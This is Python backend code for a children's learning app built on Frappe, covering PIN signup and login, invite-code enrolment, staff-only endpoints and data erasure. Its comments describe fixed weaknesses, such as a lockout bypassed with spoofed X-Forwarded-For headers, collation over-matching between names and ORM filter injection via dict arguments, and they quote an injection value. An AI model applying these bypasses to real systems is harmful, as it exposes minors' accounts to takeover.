    if not _rate_ok("signup:" + _client_ip(), 60, 3600, fail_closed=True):
        # generous for a classroom; stops spam faucets. fail_closed: signup is PRE-AUTH and
        # mints a Student row + a 90-day token, so an uncapped faucet is the destructive case —
        # if the limiter is unavailable, refuse new profiles rather than run without a ceiling.
        # Existing learners are unaffected: every lesson path stays fail-open.
        return {"ok": False, "error": "rate_limited"}
    # A name can't carry markup OR open a spreadsheet formula: it is denormalised onto every
    # row a facilitator sees in Desk and exported to XLSX from the attendance report (see
    # _display_name). Only the formula lead is dropped — her actual name is stored as typed.
    name = _display_name(name)
    if not (2 <= len(name) <= 40):
        return {"ok": False, "error": "bad_name"}
    # _docname on pin/band/cohort: scalars only (see _docname). A JSON body can send the PIN as
    # a NUMBER, and .strip() on an int used to be a 500; a dict band/cohort would reach
    # frappe.db.exists as a FILTER and "pass" the existence check as some other row.
    pin = _docname(pin, 16)
    if not (pin.isdigit() and 4 <= len(pin) <= 8):   # PIN now REQUIRED (4–8 digits) — no PIN-less profiles
        return {"ok": False, "error": "bad_pin"}
    avatar = _plain_text(avatar)[:20] or "🙂"        # an emoji, but nothing stops a crafted call;
    a = _int(age, None)                              # ZWJ-compound emoji survive (see _KEEP_FORMAT)
    age_val = a if (a is not None and 3 <= a <= 25) else None
    band, cohort = _docname(band), _docname(cohort)
    band = band if (band and frappe.db.exists("Grade Band", band)) else None

    if not cohort:
        cohort = "Online"                                  # self-signups are the online cohort
        if not frappe.db.exists("Cohort", cohort):
            try:
                frappe.get_doc({"doctype": "Cohort", "cohort_name": cohort, "mode": "Online",
                                "center": "Self sign-up"}).insert(ignore_permissions=True)
            except frappe.DuplicateEntryError:             # concurrent first signups — fine
                pass
    doc = frappe.get_doc({
        "doctype": "Student", "student_name": name, "avatar": avatar,   # both normalised above
        "cohort": cohort, "login_pin": _hash_pin(pin), "active": 1, "gender": "Other",
        "age": age_val, "band": band,
    }).insert(ignore_permissions=True)
    token = _token_for(doc.name)
    frappe.db.commit()
    return {"ok": True, "id": doc.name, "name": doc.student_name,
            "avatar": doc.avatar or "🙂", "hasPin": bool(pin), "token": token, "band": band or ""}


def _login_name_candidates(key):
    """Active students that `key` (a _login_name_key) is allowed to authenticate against, in
    the order to try them.

    THE SQL IS ONLY A PREFILTER. The authoritative test is that the row's OWN stored name
    canonicalises back to the same key, applied here in Python — which is what makes the
    bucket key and the lookup agree BY CONSTRUCTION rather than by my guessing MariaDB's
    collation table correctly. A spelling this function rejects cannot authenticate, so it
    cannot own a separate budget; and a spelling it accepts has, by definition, the same
    _login_name_key and therefore the same bucket. It also stops the collation's own
    over-matching from logging one girl into another girl's profile (proven: 'अंजू' + PIN
    returned the row of a different girl, 'अजू', because the DB gives U+0902 zero weight).

    Two passes, lazily, so an ordinary login stays an INDEXED equality lookup:
      1. `student_name = key`, indexed (Student.student_name search_index) and, under
         utf8mb4_unicode_ci, already case- and zero-width-insensitive. Every name stored
         through signup is found here, because _display_name is _login_name_key minus exactly
         the folding the collation does for us.
      2. reached only when nothing in pass 1 matched the PIN: the same lookup with ASCII
         spaces removed on BOTH sides. This finds a facilitator-created (Desk) row whose name
         holds an internal double space or a leading space — the collation treats those as
         significant, so pass 1 cannot see her and she could otherwise never log in at all.
         Unindexed, but it only runs on a login that has already failed, and the per-account
         budget bounds how often that can happen.
    The PIN is checked by the caller, so pbkdf2 is spent only on rows whose NAME really
    matches — a name the DB over-matches to fifty rows no longer costs fifty hashes."""
    fields = ["name", "student_name", "login_pin", "avatar", "band"]
    seen = set()
    for r in frappe.get_all("Student", filters={"active": 1, "student_name": key}, fields=fields):
        if _login_name_key(r.student_name) == key:
            seen.add(r.name)
            yield r
    for r in frappe.db.sql("select `name`, student_name, login_pin, avatar, band "
                           "from `tabStudent` where active = 1 "
                           "and replace(student_name, ' ', '') = %s",
                           (key.replace(" ", ""),), as_dict=True):
        if r.name not in seen and _login_name_key(r.student_name) == key:
            yield r


@frappe.whitelist(allow_guest=True)
def login_by_name(name, pin=None):
    """Log in by typing your name + PIN — NO roster is shown (cleaner, and doesn't broadcast
    minors' names). The PIN disambiguates if a name repeats. Generic error (never reveals
    whether a name exists). Locked out PER NAME — never per IP.

    The lockout key used to include _client_ip(), which made it worthless: eight wrong PINs
    from eight different X-Forwarded-For values never tripped it, so the 4-digit PIN behind
    this endpoint was brute-forceable (proven over HTTP). Replacing the IP with the typed name
    was still not enough, because the key was byte-exact while the lookup it guards is not:
    see _login_name_key for the re-spelling bypass that closed, and for the girl with a double
    space in her name whom the same normalisation lets back in. See the PIN LOCKOUT note above
    for what a per-account lockout costs and how a facilitator releases it."""
    # _login_name_key starts with _docname, not .strip(): a whitelisted argument arrives as
    # parsed JSON, so `name` can be a dict or list. `(name or "").strip()` was an
    # AttributeError → HTTP 500 on any container, and a container reaching the get_all filter
    # would be an ORM operator spec (["like", "%"]) rather than a name.
    key = _login_name_key(name)
    if not key:
        return {"ok": False, "error": "bad_login"}
    acct = _login_account_key("nm", key)
    if _login_blocked(acct):
        return {"ok": False, "error": "locked"}
    match = next((s for s in _login_name_candidates(key) if _pin_ok(s.login_pin, pin)), None)
    if not match:
        _login_failed(acct)
        return {"ok": False, "error": "bad_login"}
    _login_succeeded(acct)
    if match.login_pin and not _looks_hashed(match.login_pin):
        frappe.db.set_value("Student", match.name, "login_pin", _hash_pin(str(match.login_pin)), update_modified=False)
    token = _token_for(match.name)
    frappe.db.commit()
    return {"ok": True, "id": match.name, "name": match.student_name, "avatar": match.avatar or "🙂",
            "token": token, "band": match.band or ""}


# ---------------------------------------------------------------------------
# Online enrolment — a remote learner self-registers with a per-cohort INVITE CODE.
# Online students are real Frappe Website Users (username + PIN, synthetic no-email
# address, login-by-username) paired 1:1 with a Student record that holds their
# progress. Campus students never come through here (they're facilitator-created).
# ---------------------------------------------------------------------------
_ONLINE_EMAIL_DOMAIN = "students.hikmat.invalid"   # RFC-2606 non-routable → no mail ever leaves
_USERNAME_RE = re.compile(r"^[a-z0-9][a-z0-9._-]{2,29}$")


def _create_online_user(username, pin, full_name):
    """Create a login-only Website User: username + PIN (as the password), a synthetic
    non-routable email, no welcome mail, no Desk. Password policy is disabled site-wide
    for these PIN-based accounts (see patch v2_online_auth); staff rely on 2FA."""
    user = frappe.get_doc({
        "doctype": "User", "email": username + "@" + _ONLINE_EMAIL_DOMAIN,
        "first_name": full_name or username, "username": username,
        "user_type": "Website User", "send_welcome_email": 0, "enabled": 1,
        "new_password": pin,
    })
    user.flags.no_welcome_mail = True
    user.flags.ignore_password_policy = True
    user.insert(ignore_permissions=True)
    return user


@frappe.whitelist(allow_guest=True)
def signup_online(username=None, pin=None, invite_code=None, name=None, avatar=None, band=None):
    """Self-service ONLINE signup gated by a cohort invite code. Creates a Website User +
    linked Student (mode=Online). Rate-limited per IP. Generic errors (no enumeration)."""
    if not _rate_ok("signup:" + _client_ip(), 60, 3600, fail_closed=True):   # see signup_student
        return {"ok": False, "error": "rate_limited"}
    username = _docname(username, 30).lower()    # scalars only (see _docname); the RE does the rest
    if not _USERNAME_RE.match(username):
        return {"ok": False, "error": "bad_username"}
    pin = _docname(pin, 16)                      # may arrive as a JSON number
    if not (pin.isdigit() and 4 <= len(pin) <= 8):
        return {"ok": False, "error": "bad_pin"}
    invite_code = _docname(invite_code, 60)      # a dict here would be an ORM FILTER, not a code
    cohort = frappe.db.get_value("Cohort", {"invite_code": invite_code}, "name") if invite_code else None
    if not cohort:
        return {"ok": False, "error": "bad_invite"}
    if frappe.db.exists("User", {"username": username}) \
            or frappe.db.exists("User", username + "@" + _ONLINE_EMAIL_DOMAIN):
        return {"ok": False, "error": "username_taken"}
    # Same guard as signup_student: no markup, no spreadsheet-formula lead (see _display_name).
    # The username has already passed _USERNAME_RE, so the fallback is always safe.
    name = _display_name(name) or username
    avatar = _plain_text(avatar)[:20] or "🙂"
    band = _docname(band)
    band = band if (band and frappe.db.exists("Grade Band", band)) else None

    user = _create_online_user(username, pin, name)
    stu = frappe.get_doc({
        "doctype": "Student", "student_name": name, "avatar": avatar,   # both normalised above
        "cohort": cohort, "login_pin": _hash_pin(pin), "active": 1, "gender": "Other",
        "band": band, "mode": "Online", "user": user.name,
    }).insert(ignore_permissions=True)
    token = _token_for(stu.name)
    frappe.db.commit()
    return {"ok": True, "id": stu.name, "name": name, "avatar": stu.avatar or "🙂",
            "token": token, "band": band or "", "username": username}


@frappe.whitelist(allow_guest=True)
def get_my_student():
    """After an ONLINE Frappe login (POST /api/method/login with the username + PIN), the game
    calls this over the same session to load the linked Student's profile + a bearer token —
    the client never needs to know the student id up front. Returns {ok:False} for a guest."""
    sid = _session_student()
    if not sid:
        return {"ok": False}
    s = frappe.db.get_value("Student", sid, ["student_name", "avatar", "band"], as_dict=True)
    return {"ok": True, "id": sid, "name": s.student_name, "avatar": s.avatar or "🙂",
            "band": s.band or "", "token": _token_for(sid)}   # request-level commit persists the token


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def get_campus_roster(campus=None):
    """Provision a campus laptop for offline login: the active campus roster WITH each
    girl's PIN hash + bearer token, cached on-device so name+PIN can be verified locally
    during an offline stretch and attempts synced on reconnect. Staff only — it returns
    credentials for every girl on a campus, so it must never be reachable by a learner."""
    _require_staff()          # was an inline role check; same role, now the shared gate
    if not campus:
        return []
    rows = frappe.get_all("Student", filters={"active": 1, "mode": "Campus", "campus": campus},
                          fields=["name", "student_name", "avatar", "login_pin", "band"],
                          order_by="student_name asc")
    out = [{"id": r.name, "name": r.student_name, "avatar": r.avatar or "🙂",
            "pinHash": r.login_pin or "", "token": _token_for(r.name), "band": r.band or ""} for r in rows]
    frappe.db.commit()   # _token_for may have minted tokens
    return out


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def get_campuses():
    """Active campuses (name + location) — for the device-setup screen's campus picker.

    Staff only, and free of charge: the game calls this ONLY from renderDeviceSetup, after
    frappeLogin(teacher) has already succeeded, and its very next call is get_campus_roster
    — which has always required System Manager. So any session that could use the answer
    was already staff; a session that could not was reading the locations of centres full
    of girls for nothing. A refusal surfaces as the screen's existing "No campuses found."""
    _require_staff()
    return frappe.get_all("Campus", filters={"active": 1}, fields=["name", "location"],
                          order_by="campus_name asc")


# ---------------------------------------------------------------------------
# Analytics — STAFF-ONLY. These back Desk number cards (setup_data.py), which run in a
# facilitator's own session, so the gate costs the dashboards nothing. "Not guest" was
# never enough on its own: every online learner is a Website User, so the bare
# whitelist let any child read programme-wide figures. See the STAFF GATE note above.
# ---------------------------------------------------------------------------
@frappe.whitelist()
def active_student_count():
    """Distinct students who have at least one attempt (for the analytics card)."""
    _require_staff()
    r = frappe.db.sql("select count(distinct student) from `tabLesson Attempt`")
    return r[0][0] if r else 0


@frappe.whitelist()
def average_stars():
    """Avg stars across attempts, to 2 decimals (Int-field averaging mis-formats as currency)."""
    _require_staff()
    r = frappe.db.sql("select avg(stars) from `tabLesson Attempt`")
    return round(r[0][0], 2) if r and r[0][0] is not None else 0


@frappe.whitelist(allow_guest=True)
def get_progress(student=None, token=None):
    """Best stars per track/lesson/activity for one student — so progress follows the
    girl across shared laptops. Requires the student's login token (campus) or a matching
    online session (no reading another child's progress by guessing an id). Aggregated in
    SQL so the response is one row per (track,lesson,activity) regardless of replays."""
    if not student:
        student = _session_student()                         # online client authed by session
    if not student or not _authorized(student, token):
        return {"progress": {}}
    rows = frappe.db.sql(
        """select track, lesson, activity, max(stars) as stars
           from `tabLesson Attempt` where student=%s
           group by track, lesson, activity""",
        student, as_dict=True)
    prog = {}
    for r in rows:
        prog.setdefault(r.track, {}).setdefault(r.lesson, {})[r.activity] = r.stars or 0
    gates = {e.milestone: e.status for e in frappe.get_all(
        "Evaluation", filters={"student": student}, fields=["milestone", "status"])}
    # Module tests: pass/best per track, plus the union of every question id this
    # student has ever been served (ordered by first exposure) — so a girl on a NEW
    # device keeps her no-repeat guarantee once she's online. Bounded by bank sizes.
    tests = {}
    for r in frappe.db.sql(
            """select track, max(passed) as passed, max(pct) as best, count(*) as attempts
               from `tabTest Attempt` where student=%s group by track""", student, as_dict=True):
        tests[r.track] = {"passed": bool(r.passed), "bestPct": _int(r.best), "attempts": _int(r.attempts)}
    test_seen = {}
    if tests:
        for a in frappe.get_all("Test Attempt", filters={"student": student},
                                fields=["track", "paper"], order_by="attempted_on asc, creation asc"):
            try:
                ids = json.loads(a.paper or "[]")
            except Exception:
                ids = []
            dst = test_seen.setdefault(a.track, [])
            for qid in ids:
                if qid not in dst:
                    dst.append(qid)
    return {"progress": prog, "gates": gates, "gems": _total_gems(student),
            "tests": tests, "testSeen": test_seen}


# ---------------------------------------------------------------------------
# Right to erasure. A child's voice is the most sensitive thing this app holds,
# so deletion has to reach the rows, the private audio File docs AND the bytes
# on disk. Both entry points — delete_student (one child) and
# setup_data.wipe_demo_data (production cutover) — go through the helpers below:
# when the two kept their own lists, the whole Boli pipeline was erased by
# neither and other girls kept being served the erased child's recordings.
#
# THREE INVARIANTS a future maintainer must not "simplify" away:
#  1. ROWS BEFORE BYTES, across a commit. Unlinking audio inside the transaction that
#     deletes its rows leaves a rolled-back erasure serving clips whose audio is gone.
#  2. SCOPED BYTES. An erasure may only unlink paths taken from the erased clips' own File
#     rows. A directory sweep destroyed unrelated files, including uploads in flight.
#  3. ERASING ONE CHILD MUST NOT COST ANOTHER ONE ANYTHING — not a recording she operated,
#     not a lease, and not the gems she earned on the erased clip (_sever_peer_xp).
# ---------------------------------------------------------------------------
# Everything keyed on `student`, children before parents. Both erasure paths
# walk this list so neither can forget a table again.
_LEARNER_DOCTYPES = ("AI Conversation Turn", "AI Conversation", "Lesson Doubt",
                     "Lesson Attempt", "Test Attempt", "Learning Event",
                     "Attendance Ping", "Attendance Day", "Evaluation")
# Boli residue, in safe delete order (used for the bulk cutover wipe).
_BOLI_DOCTYPES = ("Boli Verification", "Boli Transcription", "Boli XP Ledger",
                  "Dialect Capture", "Boli Speaker")

# Bookkeeping tables that record a document's identity: {table: (doctype field, name field)}.
# Frappe clears these from delete_dynamic_links, which delete_doc only ENQUEUES
# (enqueue_after_commit=True) — on a site whose worker is down, or a campus box with no
# worker at all, those rows simply stay, so "erase ALL her data" still left her ids in
# Notification Log / Comment / DocShare. Erasure now does that cleanup synchronously; the
# queued job later finds nothing left to do.
_RESIDUE_TABLES = {"Comment": ("reference_doctype", "reference_name"),
                   "Version": ("ref_doctype", "docname"),
                   "Notification Log": ("document_type", "document_name"),
                   "ToDo": ("reference_type", "reference_name"),
                   "DocShare": ("share_doctype", "share_name"),
                   "View Log": ("reference_doctype", "reference_name"),
                   "Document Follow": ("ref_doctype", "ref_docname"),
                   "Deleted Document": ("deleted_doctype", "deleted_name")}


def _erasable(doctype, filters):
    """Names of the rows to erase — empty when the doctype predates this site."""
    if not frappe.db.exists("DocType", doctype):
        return []
    return frappe.get_all(doctype, filters=filters, pluck="name")


def _erase(doctype, names, receipt=None):
    """Force-delete rows permanently: delete_permanently skips the Deleted Document
    copy, which would otherwise keep the erased child's data around as JSON.

    `receipt` collects the (doctype, name) pairs actually deleted so _scrub_name_residue
    can find the bookkeeping rows Frappe leaves behind NAMING those docs — matching on an
    exact doc name is what keeps the scrub from ever touching another child's rows."""
    for name in names:
        frappe.delete_doc(doctype, name, force=1, ignore_permissions=True,
                          delete_permanently=True)
        if receipt is not None:
            receipt.append((doctype, name))
    return len(names)


def _db_delete_names(table, names):
    """Raw-delete rows by primary key, chunked. Raw because these are bookkeeping rows: no
    controller, and running on_trash would only mint fresh residue (a delete feed entry)."""
    for i in range(0, len(names), 500):
        frappe.db.delete(table, {"name": ["in", names[i:i + 500]]})


def _safe_delete(table, filters):
    """One best-effort bookkeeping delete, isolated: a table this site does not have, or a
    statement that loses a race with a concurrent writer (MariaDB 1020/1213), must not
    abandon the remaining scrub steps. Only ever called AFTER the erasure has committed."""
    if not frappe.db.exists("DocType", table):
        return
    try:
        frappe.db.delete(table, filters)
    except Exception:
        frappe.log_error("Student erasure: residue scrub could not clear " + table,
                         frappe.get_traceback())


def _like_literal(val):
    """Escape a doc name for use as an exact LIKE literal — an id containing % or _ must
    not turn a targeted match into a wildcard that could sweep another child's rows."""
    return (val or "").replace("\\", "\\\\").replace("%", r"\%").replace("_", r"\_")


def _private_path(file_url):
    """Absolute path of a private file, or None. Basename only, and only inside the
    private-files directory: `file_url` is a DB column, and an erasure must not be
    talked into unlinking something outside that directory by a `..` in it."""
    base = (file_url or "").rsplit("/", 1)[-1]
    if not base or base in (".", "..") or "/" in base or "\\" in base:
        return None
    root = os.path.abspath(_private_files_dir())
    full = os.path.abspath(os.path.join(root, base))
    return full if os.path.dirname(full) == root else None


def _capture_audio_paths(clips):
    """On-disk paths of these clips' private audio, read from their OWN File rows before
    anything is deleted. `file_url` is the authoritative path (`file_name` can diverge from
    what is on disk). This is the whole scope of the bytes an erasure may unlink — never a
    directory listing (see _purge_orphan_capture_files for why that mattered)."""
    if not clips:
        return []
    urls = frappe.get_all("File", filters={"attached_to_doctype": "Dialect Capture",
                                           "attached_to_name": ["in", clips]}, pluck="file_url")
    urls += frappe.get_all("Dialect Capture", filters={"name": ["in", clips]}, pluck="audio_file")
    paths = []
    for u in urls:
        p = _private_path(u)
        if p and p not in paths:
            paths.append(p)
    return paths


def _pending_unlink(paths=None):
    """Request-scoped list of audio paths whose ROWS are deleted but whose bytes no caller
    has taken responsibility for yet — a safety net for a deletion path that drops
    _erase_boli_data's return value (setup_data's cutover wipe and cohort erasure both hand
    the byte work to the maintenance sweep). The sweep drains this list, so a child's voice
    is never left on disk merely because a caller forgot, and it does NOT have to relax its
    age guard to find those bytes.

    Draining stays safe after a rollback: _erase_capture_bytes never removes a path that a
    surviving File row still claims, and a rolled-back File row claims its path again."""
    if not hasattr(frappe.local, "hikmat_pending_unlink"):
        frappe.local.hikmat_pending_unlink = []
    lst = frappe.local.hikmat_pending_unlink
    for p in (paths or []):
        if p not in lst:
            lst.append(p)
    return lst


def _erase_capture_bytes(paths):
    """Unlink audio bytes — ONLY AFTER the rows that pointed at them are committed.

    Filesystem deletes are not transactional. While the unlink happened inside the erasure
    transaction (delete_doc's File cascade), an error part-way through rolled the Dialect
    Capture and File rows BACK while the bytes stayed gone: get_boli_queue then kept
    offering the clip and get_boli_audio raised FileNotFoundError on it — a row whose audio
    is missing. Bytes-after-commit fails the other way instead: a crash can leave bytes with
    no row, which nothing serves and _purge_orphan_capture_files() later reclaims.

    A path that a SURVIVING File row still claims is left alone: those bytes may be the
    recording of a girl we are NOT erasing (rows uploaded before _unshare_capture_bytes can
    still share one path)."""
    removed = 0
    pending = _pending_unlink()
    for p in paths:
        if p in pending:
            pending.remove(p)            # handled here; the sweep need not chase it
        base = os.path.basename(p)
        if frappe.db.exists("File", {"file_url": "/private/files/" + base}):
            continue                     # still claimed → not ours to remove
        try:
            os.remove(p)
            removed += 1
        except FileNotFoundError:
            pass                         # already gone: erasure is idempotent
        except OSError:                  # unreadable/racing file must not abort the erasure
            frappe.log_error("Student erasure: could not remove " + base, frappe.get_traceback())
    return removed


def _sever_peer_xp(clips, student):
    """PRODUCT DECISION: erasure never claws back another child's earnings.

    The Boli XP Ledger is what _total_gems() sums, so DELETING a peer's row — she
    transcribed, verified or operated the erased girl's clip and was paid for it — silently
    drops that peer's gem total and can pull her back below a belt she already passed,
    punishing her for a classmate's unrelated choice. So the row stays and only the
    reference to the erased girl is severed: the `clip` link is nulled and `dedup_key`
    (which embeds the clip id) is replaced with a unique but non-identifying value, so
    nothing in the row can be traced back to the erased recording. `points`/`event` name
    nobody and are hers to keep. Rows belonging to the ERASED girl are deleted, not severed."""
    if not clips or not frappe.db.exists("DocType", "Boli XP Ledger"):
        return 0
    n = 0
    for row in frappe.get_all("Boli XP Ledger", filters={"clip": ["in", clips]},
                              fields=["name", "student"]):
        if row.student == student:
            continue                     # hers — the caller already deleted those rows
        frappe.db.set_value("Boli XP Ledger", row.name,
                            {"clip": None, "dedup_key": "severed:" + row.name},
                            update_modified=False)
        n += 1
    return n


# Pipeline states that CANNOT progress without a transcription: the verify queue needs one
# to show a judge (get_boli_queue skips a clip with none) and PA adjudication needs one to
# adjudicate. Only the transcribe queue can refill them, and it only looks at 'recorded'.
_NEEDS_TRANSCRIPTION = ("transcribed", "in_verification", "escalated")


def _reopen_stranded_clips(clip_names):
    """INVARIANT 3, the half _sever_peer_xp does not cover: erasing a TRANSCRIBER must not
    cost the RECORDER her clip.

    Erasure deletes the transcriptions the erased girl wrote — including the ones she wrote of
    OTHER children's audio, which is correct (that text is hers). But her transcription is
    what moved that clip out of 'recorded'. Delete it and nothing resets the status, so the
    clip sits in 'in_verification' with zero transcriptions: the verify queue skips it (no
    transcription to show) and the transcribe queue skips it (status != 'recorded'). No
    maintenance job resets it either, so it is stranded FOREVER — the recorder never earns her
    speaker credit and her voice never reaches the corpus. Proven end-to-end 2026-07-28.

    Fix: hand it back to the transcribe queue exactly as a rework does — status 'recorded',
    lease cleared. `rework_rounds` is deliberately NOT bumped: nobody did poor work here, and
    burning a rework round could push the clip straight to forced PA adjudication.

    NOT reopened, on purpose: a clip already 'verified'/'curated'/'exported' keeps its settled
    outcome. Reversing it would retract a number the public corpus meter has already published
    AND could never pay a replacement transcriber — _boli_mark_verified's award is deduped on
    "verified:<clip>", which is already spent. Such a clip is left with audio but no text; see
    the note in SECURITY.md."""
    if not clip_names or not frappe.db.exists("DocType", "Dialect Capture"):
        return 0
    n = 0
    for clip in {c for c in clip_names if c}:
        # Existence first: her OWN clips are deleted by now, and those must not be resurrected.
        row = frappe.db.get_value("Dialect Capture", clip, ["name", "status"], as_dict=True)
        if not row or row.status not in _NEEDS_TRANSCRIPTION:
            continue
        if frappe.db.count("Boli Transcription", {"clip": clip}):
            continue                     # another girl's transcription survives → still work
        frappe.db.set_value("Dialect Capture", clip,
                            {"status": "recorded", "claimed_by": None, "claim_expires": None},
                            update_modified=False)
        n += 1
    return n


def _release_capture_refs(student):
    """Clear the erased girl's fingerprints from OTHER children's clips: `operator` (she
    held the phone for her grandmother) and `claimed_by`/`claim_expires` (an open
    transcription lease — clearing it also releases the clip back to the queue).

    Row-at-a-time BY PRIMARY KEY, deliberately: frappe.db.set_value with a FILTER
    ({"operator": student}) is one table-wide UPDATE on an unindexed column, which took a
    lock on every Dialect Capture row — with a single uncommitted capture insert open in
    another request, erasure blocked ~12s and the request aborted. A plain SELECT followed
    by per-name UPDATEs touches only the rows that actually reference her, and stays correct
    whether or not those columns are indexed."""
    if not frappe.db.exists("DocType", "Dialect Capture"):
        return
    for name in frappe.get_all("Dialect Capture", filters={"operator": student}, pluck="name"):
        frappe.db.set_value("Dialect Capture", name, "operator", None, update_modified=False)
    for name in frappe.get_all("Dialect Capture", filters={"claimed_by": student}, pluck="name"):
        frappe.db.set_value("Dialect Capture", name, {"claimed_by": None, "claim_expires": None},
                            update_modified=False)


def _erase_boli_data(student, receipt=None):
    """Erase one student's whole voice trail, children before parents. Idempotent, so a
    half-finished erasure can simply be re-run.

    RETURNS the on-disk audio paths of her clips, for the caller to unlink AFTER its commit
    (_erase_capture_bytes). Rows first, bytes last: that ordering is what stops an
    interrupted erasure from leaving a clip whose audio is missing. A caller that DROPS that
    return value erases her rows but leaves her voice on disk until the age-guarded
    maintenance sweep reclaims it — every deletion path must unlink what it is handed.

    A clip where she is only `operator` (she held the phone for her grandmother) or
    `claimed_by` (an open transcription lease) is ANOTHER child's recording: those
    fields are cleared instead, which also releases the lease back to the queue."""
    clips = _erasable("Dialect Capture", {"student": student})
    paths = _capture_audio_paths(clips)          # while the File rows still exist
    _erase("Boli Verification", _erasable("Boli Verification", {"verifier": student}), receipt)
    if clips:   # other girls' votes on her audio
        _erase("Boli Verification", _erasable("Boli Verification", {"clip": ("in", clips)}), receipt)
    trans = _erasable("Boli Transcription", {"author": student})
    if clips:   # other girls' transcriptions of her audio
        trans += [t for t in _erasable("Boli Transcription", {"clip": ("in", clips)})
                  if t not in trans]
    # Which clips those transcriptions belonged to, read BEFORE the rows go — the survivors
    # among them are other children's recordings that must not be left mid-pipeline
    # (_reopen_stranded_clips, called once the deletions are done).
    trans_clips = (frappe.get_all("Boli Transcription", filters={"name": ("in", trans)},
                                  pluck="clip") if trans else [])
    if trans:   # a vote still pointing at one of these would dangle, so it goes first
        _erase("Boli Verification", _erasable("Boli Verification", {"transcription": ("in", trans)}),
               receipt)
        _erase("Boli Transcription", trans, receipt)
    _erase("Boli XP Ledger", _erasable("Boli XP Ledger", {"student": student}), receipt)
    _sever_peer_xp(clips, student)       # peers keep their gems, minus the reference to her
    if clips:
        # File ROWS only. delete_doc's attachment cascade would unlink the audio inside this
        # transaction, which is exactly the interrupted-erasure hazard (_erase_capture_bytes);
        # the raw delete also skips the "Attachment Removed" feed comment that would otherwise
        # name her clip's file after the row itself is gone.
        fnames = frappe.get_all("File", filters={"attached_to_doctype": "Dialect Capture",
                                                 "attached_to_name": ["in", clips]}, pluck="name")
        if fnames:
            _db_delete_names("File", fnames)
    _erase("Dialect Capture", clips, receipt)
    _release_capture_refs(student)
    # AFTER her own clips are gone, so the survivors in trans_clips are by definition other
    # children's recordings (see invariant 3 above).
    _reopen_stranded_clips(trans_clips)
    # the real-name → voice bridge; also what makes Frappe refuse a Desk delete
    _erase("Boli Speaker", _erasable("Boli Speaker", {"student": student}), receipt)
    _pending_unlink(paths)               # safety net if the caller ignores the return value
    return paths


def _erase_student_user(user, receipt=None):
    """An online learner's identity also lives in a Frappe User (synthetic
    *.hikmat.invalid). Delete it; if something still links to it, at least disable
    it and scrub the name so no identifying text survives."""
    if not user or not frappe.db.exists("User", user):
        return
    try:
        frappe.delete_doc("User", user, force=1, ignore_permissions=True,
                          delete_permanently=True)
        if receipt is not None:
            receipt.append(("User", user))
            # User.on_trash cascades to Notification Settings (named after the email) WITHOUT
            # delete_permanently, so Frappe archives her email + that doc's JSON in Deleted
            # Document — which defeats the point of delete_permanently. Named here so the
            # residue scrub reaches both it and its delete-feed comment.
            receipt.append(("Notification Settings", user))
    except Exception:
        frappe.log_error("Student erasure: User delete failed, scrubbing instead",
                         frappe.get_traceback())
        frappe.db.set_value("User", user, {"enabled": 0, "full_name": "Erased",
                                           "first_name": "Erased", "middle_name": None,
                                           "last_name": None, "username": None},
                            update_modified=False)


def _scrub_name_residue(receipt, student=None, user=None):
    """Best-effort scrub of the plaintext residue Frappe's own cleanup cannot reach. After a
    "delete ALL her data" a full-table scan still found her id, name or user in:
      * Comment — Frappe's delete feed (model/delete_doc.py insert_feed) writes
        comment_type='Deleted', subject='<DocType> <name>' and NO reference_name, so the
        reference-keyed cleanup can never match those rows: "Student <id>",
        "Boli Speaker CHM-SPK-…" survive forever.
      * Notification Log / DocShare / Version / ToDo / … — see _RESIDUE_TABLES: cleaned only
        by a QUEUED job, i.e. not at all on a site with no worker.
      * Deleted Document — a cascaded child deleted without delete_permanently (her
        Notification Settings) is archived as JSON, defeating delete_permanently.
      * DefaultValue / Document Follow / bell alerts addressed to her own user id.

    Matching is by EXACT doc name, or by her unique student/user id — never by a free-text
    search for her NAME: two girls in one cohort can share a name and only she may be erased.
    Best-effort, one statement at a time (_safe_delete): her actual data rows are already gone
    and COMMITTED by the time this runs, so a bookkeeping table this site does not have — or
    one statement losing a race with a concurrent writer — must neither turn erasure into a
    500 nor abandon the rest of the scrub. CALL THIS AFTER THE COMMIT, never inside the
    erasure transaction: a statement error can make MariaDB roll the transaction back, and
    tidying bookkeeping is not worth risking the erasure itself."""
    by_dt = {}
    for dt, name in receipt:
        if name:
            by_dt.setdefault(dt, []).append(name)
    for dt, names in by_dt.items():
        for i in range(0, len(names), 500):
            chunk = names[i:i + 500]
            for table, (dt_field, name_field) in _RESIDUE_TABLES.items():
                _safe_delete(table, {dt_field: dt, name_field: ["in", chunk]})
            # the reference_name-less delete feed: match its exact subject instead
            subjects = ["%s %s" % (dt, n) for n in chunk]
            label = _(dt)
            if label != dt:                  # the feed subject is translated
                subjects += ["%s %s" % (label, n) for n in chunk]
            _safe_delete("Comment", {"comment_type": "Deleted", "reference_doctype": dt,
                                     "subject": ["in", subjects]})
    # Bell alerts whose document_name is a COMPOSITE embedding her id — _check_milestones
    # writes document_name="EV-<student>-<milestone>", which no (doctype, name) pair matches.
    if student and frappe.db.exists("DocType", "Notification Log"):
        _safe_delete("Notification Log",
                     {"document_name": ("like", "%" + _like_literal(student) + "%")})
    if user:
        for table, field in (("Notification Log", "for_user"), ("Notification Log", "from_user"),
                             ("DocShare", "user"), ("Document Follow", "user"),
                             ("DefaultValue", "parent"), ("Deleted Document", "deleted_name")):
            _safe_delete(table, {field: user})
        frappe.clear_cache(user=user)


def _erasure_residue(student):
    """True when rows keyed on this student id outlive her Student row — a half-finished
    erasure (or one done by an older code path) that a re-run should FINISH rather than
    refuse with not_found."""
    for dt in _LEARNER_DOCTYPES + ("Dialect Capture", "Boli Speaker", "Boli XP Ledger"):
        if _erasable(dt, {"student": student}):
            return True
    for dt, field in (("Boli Transcription", "author"), ("Boli Verification", "verifier"),
                      ("Dialect Capture", "operator"), ("Dialect Capture", "claimed_by")):
        if _erasable(dt, {field: student}):
            return True
    return False


def _purge_orphan_capture_files(min_age_secs=900):
    """MAINTENANCE SWEEP for leftover audio — explicitly invoked (the production-cutover
    wipe), and deliberately NOT part of delete_student.

    It used to be, and that was destructive: it walked the whole private-files directory and
    removed every file no File doc claimed, with no scoping to the child being erased. A
    verifier planted two probes there and lost BOTH to one delete_student call — an untracked
    file, and a capture that was mid-upload. The second case is real, not theoretical:
    _save_dialect_capture writes the audio through File.validate() BEFORE its commit, so a
    sweep in another request cannot see the row yet but CAN see the bytes — erasing one girl
    could destroy another girl's recording while she was still uploading it. Hence two
